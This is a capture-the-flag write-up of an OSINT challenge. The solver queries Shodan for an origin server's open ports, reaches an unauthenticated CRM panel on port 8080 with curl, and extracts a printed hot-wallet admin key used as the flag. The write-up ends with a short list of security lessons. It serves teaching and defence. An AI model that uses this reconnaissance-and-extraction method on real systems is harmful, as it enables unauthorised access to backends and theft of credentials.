Cloudflare_Deanon


### Cloudflare Deanon: Find the Back Office

**Category:** OSINT
**Difficulty:** Medium
**Points:** 327
**Solved by:** cracker

#### Tools Used
- `Shodan InternetDB` — Port discovery on origin IP
- `curl` — HTTP requests to non-standard port

#### Approach

**Step 1 — Port Scan on Origin IP**

Using the origin IP discovered in the previous task, checked what services were running:

```bash
curl -sk "https://internetdb.shodan.io/185.146.86.118" | python3 -m json.tool
```

Result:
```json
{
  "cpes": ["cpe:/a:f5:nginx"],
  "hostnames": ["cw185-adf-hf118.romania-webhosting.com"],
  "ip": "185.146.86.118",
  "ports": [8080],
  "tags": [],
  "vulns": []
}
```

Port **8080** was open — a non-standard port not exposed through the Cloudflare/Accelerator layer.

**Step 2 — Access the Backend Panel**

```bash
curl -sk "http://185.146.86.118:8080" -D - | head -15
```

Result:
```
HTTP/1.1 200 OK
Server: nginx
Content-Type: text/html
<title>NestEgg CRM | Backend</title>
```

The backend panel was accessible with no authentication required.

**Step 3 — Extract the Admin Key**

```bash
curl -sk "http://185.146.86.118:8080" | grep -A5 "Hot wallet admin key"
```

Result:
```
Hot wallet admin key:
t2YGg14buPVPPnd9uvazWcdvT9UMCh3J
```

#### Why It Works

The backend panel on port 8080 was not routed through the AWS Global Accelerator, meaning it was directly accessible from the public internet. The panel had no authentication layer, so anyone who discovered the origin IP and checked non-standard ports could access it immediately.

#### Validation

Direct HTTP request to `185.146.86.118:8080` returned:
- HTTP 200 OK
- Page title: `NestEgg CRM | Backend`
- Hot wallet admin key shown verbatim on the page

**Flag:** `CSCTF{t2YGg14buPVPPnd9uvazWcdvT9UMCh3J}`

---

## Security Lessons

Both challenges highlight a common misconfiguration:

**1. Exposed Origin IP**
The origin server accepted direct connections from any IP on the internet. The correct configuration is a firewall rule that only accepts traffic from the CDN/Accelerator IP ranges.

**2. Unauthenticated Backend Panel**
The CRM backend on port 8080 had no authentication. Any service exposed to the public internet must require authentication.

**3. Leaked Internal Hostnames**
HTTP responses revealed internal AWS hostnames (`ip-100-74-x-x.eu-west-2.compute.internal`). Server headers should be suppressed or replaced with generic values.
